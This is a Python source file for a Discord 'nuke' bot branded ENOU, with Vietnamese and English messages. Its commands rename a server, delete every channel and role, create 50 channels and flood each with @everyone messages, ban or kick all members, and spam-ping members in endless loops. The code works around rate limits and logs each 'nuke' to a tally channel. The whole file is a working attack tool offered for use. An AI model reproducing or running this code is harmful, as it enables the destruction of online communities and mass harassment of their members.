import random
import discord	# type: ignore
from discord.ext import commands, tasks  # type: ignore
from discord import app_commands
import asyncio
import os
from colorama import Style, init

init(autoreset=True)
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")
def gradient_color(r1, g1, b1, r2, g2, b2, ratio):
    r = int(r1 + (r2 - r1) * ratio)
    g = int(g1 + (g2 - g1) * ratio)
    b = int(b1 + (b2 - b1) * ratio)
    return f"\033[38;2;{r};{g};{b}m"
def gradient_text(line):
    gradient = ""
    mid_point = len(line) // 2
    left_color = (128, 0, 128)  # RGB của tím
    right_color = (0, 255, 255) 
    for i, char in enumerate(line):
        if char == " ":
            gradient += char
            continue
        # Tính tỷ lệ chuyển đổi màu
        ratio = i / len(line)
        if ratio <= 0.5:
            color_ratio = ratio * 2 
            gradient += gradient_color(*left_color, *right_color, color_ratio) + char
        else:
            color_ratio = (ratio - 0.5) * 2
            gradient += gradient_color(*right_color, *left_color, 1 - color_ratio) + char
    return gradient + Style.RESET_ALL
def display_enou_bot_v1():
    art = [
        "                                                            _____ _   _  ___  _   _    ____   ___ _____   __     ___ ",
        "                                                           | ____| \ | |/ _ \| | | |  | __ ) / _ \_   _|  \ \   / / |",
        "                                                           |  _| |  \| | | | | | | |  |  _ \| | | || |     \ \ / /| |",
        "                                                           | |___| |\  | |_| | |_| |  | |_) | |_| || |      \ V / | |",
        "                                                           |_____|_| \_|\___/ \___/   |____/ \___/ |_|       \_/  |_|",
    ]
    clear_screen()
    for line in art:
        print(gradient_text(line))
if __name__ == "__main__":
    display_enou_bot_v1()

intents = discord.Intents.all()     
bot = commands.Bot(command_prefix=".", intents=intents)
bot = commands.Bot(command_prefix=".", intents=discord.Intents.all(), help_command=None)

MESSAGE_CONTENT = "# @everyone NUKE BY discord.gg/enou"
MESSAGES_PER_CHANNEL = 1000
NEW_SERVER_NAME = "NUKE BY ENOU"
CHANNEL_COUNT = 50
WHITELISTED_SERVERS = [1322089249884999692]
LOG_CHANNEL_ID = 1324805569428586517
active_servers = set()

@bot.event
async def on_ready():
    activity = discord.Activity(type=discord.ActivityType.playing, name=".help")
    await bot.change_presence(status=discord.Status.dnd, activity=activity)
    await bot.tree.sync()

async def send_logs(ctx, command_name):
    try:
        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            member_count = ctx.guild.member_count
            messages = [msg async for msg in log_channel.history(limit=None)]
            log_count = len(messages) + 1 
            embed = discord.Embed(
                title="Logs",
                color=discord.Color.red()
            )
            embed.add_field(name="**<a:bo:1322122298039205948> User:**", value=f"{ctx.author} ({ctx.author.id})", inline=False)
            embed.add_field(name="**<a:bo:1322122298039205948> Server:**", value=f"{ctx.guild.name} ({ctx.guild.id})", inline=False)
            embed.add_field(name="**<a:bo:1322122298039205948> Members:**", value=f"{member_count}", inline=False)
            embed.add_field(name="**<a:bo:1322122298039205948> Total Nuke:**", value=f"{log_count}", inline=False)
            await log_channel.send(embed=embed)
    except Exception as e:
        print(f"Lỗi khi gửi logs: {e}")

@bot.hybrid_command(name="help", description="Hướng dẫn sử dụng bot / Bot Commands Guide")
async def help_command(ctx: commands.Context):
    embed = discord.Embed(
        title="Hướng Dẫn Sử Dụng Bot | Bot Commands Guide",
        color=discord.Color.blue()
    )
    embed.add_field(    
        name="Lệnh | Commands",
        value=(
            "**.help** - Hướng dẫn sử dụng bot / Show this help message\n"
            "**.ping** - Kiểm tra độ trễ của bot / Check ping of bot\n"
            "**.enou** - Nuke server\n"
            "**.raidnoperm** - Raid ko cần quyền hạn / Raid doesn't require permission.\n"
            "**.spam** - Spam chat  .\n"
            "**.massban** - Ban tất cả members / Ban all members\n"
            "**.masskick** - Kick tất cả members / Kick all members\n"
            "**.rolelist** - Hiện danh sách role / Display the list of roles\n"
            "**.delchannel** - Xóa tất cả channels / Delete all channels\n"
            "**.delrole** - Xóa tất cả roles / Delete all roles\n"
            "**.createchannel** - Tạo channels mới / Create new channels\n"
        ),
        inline=False
    )
    embed.set_image(url="https://i.imgur.com/iSYn02U.gif") 
    embed.set_footer(
        text="Support server: https://ln.run/g6P22",
        icon_url="https://i.imgur.com/e06BYUi.png"  
    )
    await ctx.send(embed=embed)

@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    await ctx.send(f'**🏓 Pong! Độ trễ của bot là {latency}ms / Ping of bot is {latency}ms**')

@bot.command()
async def enou(ctx):
    guild_id = ctx.guild.id
    if ctx.guild.id in WHITELISTED_SERVERS:
        await ctx.send("**🚫 Server nằm trong whitelist / Server is in whitelist**")
        return
    if guild_id in active_servers:
        await ctx.send("**🚫 Lệnh đang được thực hiện trong server này / The command is being executed on this server**")
        return
    active_servers.add(guild_id)
    try:
        await send_logs(ctx, "enou (nuke)")
        
        async def rename_server():
            try:
                await ctx.guild.edit(name=NEW_SERVER_NAME)
            except Exception:
                pass
        async def delete_channels():
            delete_tasks = [
                channel.delete()
                for channel in ctx.guild.channels
                if channel != ctx.channel
            ]
            await asyncio.gather(*delete_tasks, return_exceptions=True)
        await asyncio.gather(rename_server(), delete_channels())
        create_tasks = [
            ctx.guild.create_text_channel(name="NUKE BY ENOU")
            for _ in range(CHANNEL_COUNT)
        ]
        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
        channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
        sem = asyncio.Semaphore(35)
        async def send_messages(channel):
            async with sem:
                for _ in range(MESSAGES_PER_CHANNEL):
                    try:
                        await channel.send(MESSAGE_CONTENT)
                        await asyncio.sleep(0.3)
                    except discord.HTTPException as e:
                        if e.status == 429:
                            retry_after = e.retry_after
                            print(f"Rate limit hit. Retrying after {retry_after:.2f} seconds...")
                            await asyncio.sleep(retry_after)
                        else:
                            print(f"Error sending message in {channel.name}: {e}")
                            break

        message_tasks = [send_messages(channel) for channel in channels]
        await asyncio.gather(*message_tasks, return_exceptions=True)
    finally:
        active_servers.remove(guild_id)
@bot.command()
async def massban(ctx):
    if ctx.guild.id in WHITELISTED_SERVERS:
        await ctx.send("**🚫 Server nằm trong whitelist/Server is in whitelist**")
        return
    for member in ctx.guild.members:
        if member != ctx.guild.owner: 
            try:
                await member.ban(reason="")
            except Exception:
                pass

@bot.command()
async def delchannel(ctx):
    if ctx.guild.id in WHITELISTED_SERVERS:
        await ctx.send("**🚫 Server nằm trong whitelist/Server is in whitelist**")
        return
    delete_tasks = [
        channel.delete()  # Đảm bảo phương thức được await
        for channel in ctx.guild.channels
    ]
    await asyncio.gather(*delete_tasks, return_exceptions=True)
    
@bot.command()
async def delrole(ctx):
    if ctx.guild.id in WHITELISTED_SERVERS:
        await ctx.send("**🚫 Server nằm trong whitelist/Server is in whitelist**")
        return
    sem = asyncio.Semaphore(5)  
    async def delete_role(role):
        async with sem:
            try:
                await role.delete()
                await asyncio.sleep(0.5) 
            except discord.HTTPException as e:
                if e.status == 429: 
                    retry_after = e.retry_after
                    print(f"Rate limit hit for role {role.name}. Retrying after {retry_after:.2f} seconds...")
                    await asyncio.sleep(retry_after)
    delete_tasks = [
        delete_role(role)
        for role in ctx.guild.roles
        if role != ctx.guild.default_role and role < ctx.guild.me.top_role
    ]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

@bot.command()
async def masskick(ctx):
    if ctx.guild.id in WHITELISTED_SERVERS:
        await ctx.send("**🚫 Server nằm trong whitelist/Server is in whitelist**")
        return
    sem = asyncio.Semaphore(5)  
    async def kick_member(member):
        async with sem:
            try:
                await member.kick(reason="nükë bÿ ënöü456")
                await asyncio.sleep(0.5)  
            except discord.HTTPException as e:
                if e.status == 429:  
                    retry_after = e.retry_after
                    print(f"Rate limit hit for {member.name}. Retrying after {retry_after:.2f} seconds...")
                    await asyncio.sleep(retry_after)
    kick_tasks = [kick_member(member) for member in ctx.guild.members]
    await asyncio.gather(*kick_tasks, return_exceptions=True)

@bot.command()
async def raidnoperm(ctx):
    guild = ctx.guild
    guild_id = guild.id
    if guild_id in active_servers:
        await ctx.send("**🚫 Lệnh đang được thực hiện trong server này / The command is being executed on this server**")
        return
    if ctx.guild.id in WHITELISTED_SERVERS:
        await ctx.send("**🚫 Server nằm trong whitelist/Server is in whitelist**")
        return
    active_servers.add(guild_id)
    try:
        members = [member for member in guild.members if not member.bot]
        if not members:
            return
        semaphore = asyncio.Semaphore(35)
        async def send_messages(channel):
            async with semaphore:
                try:
                    while True:
                        member = random.choice(members)
                        message = f"{member.mention} 😀😃😄😁😆🥹😅😂🤣🥲☺️😊😇🙂🙃😉😌😍🥰😘😗😙😚😋😛😜🤪🤨🧐🤓😎🥸🤩🥳😏😒😞😔😟😕🙁😣☹️😖😫😩🥺😢😭😤😠😡🤬🤯😳🥵🥶😶‍🌫️😱😨😰😥😓🤗🤔🫣🤭🫢🫡🤫🫠🤥😶🫥😐🫤😑🫨🙂‍↔️🙂‍↕️😬🙄😯😦😧😮😲😴🥱🤤😪😮‍💨😵😵‍💫"
                        await channel.send(message)
                        await asyncio.sleep(0.3)
                except discord.Forbidden:
                    print(f"Không thể gửi tin nhắn vào kênh {channel.name}. Bỏ qua kênh này.")
                except discord.HTTPException as e:
                    print(f"Lỗi khi gửi tin nhắn trong {channel.name}: {e}")
        channels = [
            channel
            for channel in guild.text_channels
            if channel.permissions_for(guild.me).send_messages
        ]
        if not channels:
            return
        tasks = [send_messages(channel) for channel in channels]
        await asyncio.gather(*tasks)
    finally:
        active_servers.remove(guild_id)

@bot.command()
async def createchannel(ctx):
    if ctx.guild.id in WHITELISTED_SERVERS:
        await ctx.send("**🚫 Server nằm trong whitelist/Server is in whitelist**")
        return
    channel_name = "ʀᴀιᴅ ʙʏ ᴇɴou "
    channel_count = 1
    created_channels = []
    failed_channels = []
    for i in range(channel_count):
        try:
            channel = await ctx.guild.create_text_channel(name=f"{channel_name}")
            created_channels.append(channel)
        except discord.Forbidden:
            failed_channels.append(f"{channel_name}")
        except discord.HTTPException as e:
            failed_channels.append(f"{channel_name}")

@bot.command()
async def rolelist(ctx):
    guild = ctx.guild
    roles = sorted(guild.roles, key=lambda r: r.position, reverse=True)
    role_mentions = [role.mention for role in roles if role.name != "@everyone"]
    chunk_size = 1024  # Maximum length per field
    embeds = []
    current_chunk = ""
    for role in role_mentions:
        if len(current_chunk) + len(role) + 1 > chunk_size:
            embed = discord.Embed(
                title="ROLE LIST",
                color=discord.Color.blue()
            )
            embed.add_field(name="ENOU DEVELOPMENT", value=current_chunk, inline=False)
            embeds.append(embed)
            current_chunk = ""
        current_chunk += role + "\n"
    if current_chunk:
        embed = discord.Embed(
            title="ROLE LIST",
            color=discord.Color.blue()
        )
        embed.add_field(name="ENOU DEVELOPMENT", value=current_chunk, inline=False)
        embeds.append(embed)
    sent_messages = []
    for embed in embeds:
        sent_messages.append(await ctx.send(embed=embed))
    await asyncio.sleep(5)
    for message in sent_messages:
        await message.delete()

@bot.command()
async def spam(ctx):
    guild = ctx.guild
    guild_id = guild.id
    if guild_id in WHITELISTED_SERVERS:
        await ctx.send("**🚫 Server nằm trong whitelist/Server is in whitelist**")
        return
    if guild_id in active_servers:
        await ctx.send("**🚫 Lệnh đang được thực hiện trong server này / The command is being executed on this server**")
        return
    active_servers.add(guild_id)
    try:
        MESSAGE_CONTENT2 = (
            "# ENOU ON TOP!"
        )
        semaphore = asyncio.Semaphore(35)

        async def send_messages(channel):
            async with semaphore:
                while True:
                    try:
                        await channel.send(MESSAGE_CONTENT2)
                        await asyncio.sleep(0.3)
                    except discord.Forbidden:
                        print(f"Không thể gửi tin nhắn trong kênh {channel.name}")
                        break
                    except discord.HTTPException as e:
                        print(f"Lỗi gửi tin nhắn trong kênh {channel.name}: {e}")
                        await asyncio.sleep(1)
        text_channels = [
            channel
            for channel in guild.text_channels
            if channel.permissions_for(guild.me).send_messages
        ]
        if not text_channels:
            return
        tasks = [send_messages(channel) for channel in text_channels]
        await asyncio.gather(*tasks, return_exceptions=True)
    finally:
        active_servers.remove(guild_id)

bot.run("TOKEN")
